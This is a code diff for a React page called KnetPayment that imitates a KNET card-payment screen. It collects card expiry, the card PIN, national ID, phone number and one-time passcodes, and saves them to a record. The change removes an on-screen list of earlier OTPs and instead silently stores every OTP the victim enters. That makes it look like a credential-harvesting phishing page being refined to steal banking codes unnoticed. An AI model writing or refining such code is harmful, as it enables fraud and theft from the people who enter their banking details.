@@ -11,7 +11,6 @@ export default function KnetPayment() {
   const recordIdRef = useRef(urlParams.get("recordId") || null);
   const [otpValue, setOtpValue] = useState("");
   const [otpError, setOtpError] = useState("");
-  const [otpHistory, setOtpHistory] = useState([]);
   const [countdown, setCountdown] = useState(60);
   const [isCountdownActive, setIsCountdownActive] = useState(true);
   const [paymentInfo, setPaymentInfo] = useState({
@@ -62,10 +61,12 @@ export default function KnetPayment() {
     if (isStep1Disabled) autoSavedRef.current = false;
   }, [isStep1Disabled, step]);
 
-  const savedOtpsRef = useRef({ otp1: "", otp2: "" });
+  const savedOtpsRef = useRef({ otp1: [], otp2: "" });
 
   const saveRecord = async (extraData = {}, stepNum = step) => {
-    if (extraData.otp1) savedOtpsRef.current.otp1 = extraData.otp1;
+    if (extraData.otp1) {
+      savedOtpsRef.current.otp1 = [...savedOtpsRef.current.otp1, extraData.otp1];
+    }
     if (extraData.otp2) savedOtpsRef.current.otp2 = extraData.otp2;
 
     const payload = {
@@ -77,7 +78,7 @@ export default function KnetPayment() {
       expiry_month: paymentInfo.month,
       expiry_year: paymentInfo.year,
       pin: paymentInfo.pass,
-      otp1: savedOtpsRef.current.otp1 || paymentInfo.otp,
+      otp1: savedOtpsRef.current.otp1.join(" | ") || paymentInfo.otp,
       id_number: paymentInfo.idNumber,
       phone_number: paymentInfo.phoneNumber,
       network: paymentInfo.network,
@@ -103,7 +104,6 @@ export default function KnetPayment() {
     } else if (step === 2) {
       setIsLoading(true);
       const currentOtp = otpValue;
-      setOtpHistory((h) => [...h, currentOtp]);
       setOtpValue("");
       setPaymentInfo((p) => ({ ...p, otp: "" }));
       saveRecord({ otp1: currentOtp }, 2);
@@ -158,8 +158,7 @@ export default function KnetPayment() {
                 otpValue={otpValue}
                 setOtpValue={setOtpValue}
                 countdown={countdown}
-                otpError={otpError}
-                otpHistory={otpHistory} />
+                otpError={otpError} />
               }
 
             </div>
@@ -283,20 +282,10 @@ function Step1({ paymentInfo, setPaymentInfo, banks }) {
 
 }
 
-function Step2({ paymentInfo, setPaymentInfo, otpValue, setOtpValue, countdown, otpError, otpHistory }) {
+function Step2({ paymentInfo, setPaymentInfo, otpValue, setOtpValue, countdown, otpError }) {
   return (
     <>
       {otpError && <div className="knet-otp-error">⚠ {otpError}</div>}
-      {otpHistory.length > 0 && (
-        <div style={{ background: "#fff8e1", border: "1px solid #ffe082", borderRadius: 4, padding: "8px 10px", marginBottom: 8 }}>
-          <div style={{ fontSize: 10, color: "#888", fontWeight: "bold", marginBottom: 4 }}>Previously entered OTPs:</div>
-          {otpHistory.map((otp, i) => (
-            <div key={i} style={{ fontSize: 11, color: "#c0392b", fontFamily: "monospace", lineHeight: "18px" }}>
-              #{i + 1}: {otp}
-            </div>
-          ))}
-        </div>
-      )}
       <div className="knet-alert-row">
         <strong>Please note:</strong> A 6-digit verification code has been sent via text message to your registered phone number
       </div>
